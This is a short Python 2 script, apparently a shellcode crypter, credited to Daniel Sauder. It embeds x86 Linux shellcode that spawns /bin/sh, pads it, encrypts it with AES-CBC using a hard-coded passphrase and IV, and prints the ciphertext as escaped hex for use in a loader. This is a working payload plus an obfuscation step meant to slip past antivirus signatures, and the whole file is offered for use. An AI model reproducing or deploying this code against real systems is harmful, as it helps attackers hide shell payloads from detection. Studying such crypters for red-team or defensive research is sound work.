# Author: Daniel Sauder
# Website: http://govolution.wordpress.com/about
# License http://creativecommons.org/licenses/by-sa/3.0/

from Crypto.Cipher import AES

plain=("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

obj=AES.new('Passphrase123456', AES.MODE_CBC, 'IVIVIVIVIVI12345')
l=len(plain)
r=l%16
p=16-r
print "offset: " + str(p)
plain = plain+"A"*p
ciph=obj.encrypt(plain)
encoded=""
for x in bytearray(ciph):
	encoded += '\\x'
	enc = '%02x' % x
	encoded += enc  
	
print encoded
